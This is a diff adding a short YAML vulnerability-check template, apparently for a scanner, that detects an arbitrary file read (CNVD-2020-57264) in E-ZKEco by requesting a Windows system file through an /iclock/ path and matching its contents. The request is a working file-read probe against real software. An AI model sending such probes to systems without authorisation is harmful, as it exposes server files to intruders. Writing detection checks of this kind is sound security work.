@@ -1,0 +1,12 @@
+name: poc-yaml-e-zkeco-cnvd-2020-57264-read-file
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /iclock/ccccc/windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: r0()
+detail:
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2020-57264
